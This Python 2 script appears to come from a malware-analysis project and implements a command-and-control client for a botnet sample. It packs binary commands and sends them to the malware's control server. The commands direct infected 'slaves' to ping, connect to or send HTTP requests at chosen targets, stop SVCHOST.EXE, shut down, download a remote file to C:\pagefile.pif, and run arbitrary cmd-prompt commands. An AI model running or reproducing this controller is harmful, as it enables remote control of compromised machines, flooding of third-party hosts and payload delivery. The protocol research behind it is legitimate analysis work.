#!/usr/bin/python2
#
# Server to receive malware.tmp info
#
# @author Brian Hession
# @email bhession@gmu.edu
#

from __future__ import print_function
import sys, socket, struct

ctlserver = ('localhost', 6666)

def parseCmd(args):
    if len(args) < 1:
        print_usage_and_exit()
    cmd = args[0]
    options = args[1:]
    data = None
    if cmd == 'list':
        data = packStruct(0)
    elif cmd == 'testICMP':
        raise Exception('not implemented')
    elif cmd == 'ws1NetBIOS':
        raise Exception('not implemented')
    elif cmd == 'ws2NetBIOS':
        raise Exception('not implemented')
    elif cmd == 'ping':
        if len(options) != 1:
            print_usage_and_exit()
        data = packStruct(4, options[0])
    elif cmd == 'connect':
        if len(options) != 2:
            print_usage_and_exit()
        data = packStruct(5, options[0], int(options[1]))
    elif cmd == 'tcp':
        if len(options) != 2:
            print_usage_and_exit()
        data = packStruct(6, options[0], int(options[1]))
    elif cmd == 'httpURI':
        if len(options) != 1:
            print_usage_and_exit()
        data = packStruct(7, options[0])
    elif cmd == 'httpSpec':
        if len(options) != 1:
            print_usage_and_exit()
        data = packStruct(8, options[0])
    elif cmd == 'httpIndex':
        if len(options) != 1:
            print_usage_and_exit()
        data = packStruct(9, options[0])
    elif cmd == 'shutdown':
        data = packStruct(98)
    elif cmd == 'stopService':
        data = packStruct(99)
    elif cmd == 'stop':
        data = packStruct(100)
    elif cmd == 'dlFile':
        if len(options) != 1:
            print_usage_and_exit()
        data = packStruct(101, options[0])
    elif cmd == 'execShCmd':
        if len(options) != 1:
            print_usage_and_exit()
        data = packStruct(102, options[0])
    elif cmd == 'severConn':
        data = packStruct(255)
    else:
        print_usage_and_exit()
    if len(data) == 0x70:
        sendCmd(cmd, data)
    else:
        print('Error: data is not of length 70h ({:02x}h)'.format(len(data)))

def packStruct(opcode, argument='', port=0):
    "Network endian (big) failed. Had to change to little-endian"
    return struct.pack('< I 100s H x x I', opcode, argument, port, 1)

def sendCmd(cmd, data):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(ctlserver)
    try:
        sock.sendall(data)
        if cmd == 'list':
            sock.settimeout(50.0 / 1000.0)
            while True:
                try:
                    data = sock.recv(4096)
                    if data:
                        sys.stdout.write(data)
                    else:
                        break
                except socket.timeout:
                    continue
            sys.stdout.write('\r\n')
    finally:
        sock.close()

def print_usage_and_exit():
    print('Usage:', sys.argv[0], '<command> [arguments...]')
    print('')
    print('COMMANDS')
    print('list                            - prints all slaves')
    print('testICMP                        - not implemented')
    print('ws1NetBIOS                      - not implemented')
    print('ws2NetBIOS                      - not implemented')
    print('ping <target>                   - sends ICMP echo request')
    print('connect <target> <port>         - connects then closes socket')
    print('tcp <target> <port>             - sends `aGet_htmgetRtg` string')
    print('httpURI <URL>                   - GET /*(&*^TGH*JIHG^&*(&^%*(*)OK)(*&^%$EDRGF%&^.html')
    print('httpSpec <URL>                  - GET /specified-uri')
    print('httpIndex <URL>                 - GET /')
    print('shutdown                        - shuts down slave')
    print('stopService                     - stops SVCHOST.EXE')
    print('dlFile <URL>                    - downloads target to C:\pagefile.pif')
    print('execShCmd "<command> [args...]" - runs command in cmd prompt')
    print('stop                            - stops execution loop')
    print('severConn                       - closes victim socket (fetches new ctlServer)')
    print('')
    sys.exit(0)

if __name__ == '__main__':
    parseCmd(sys.argv[1:])
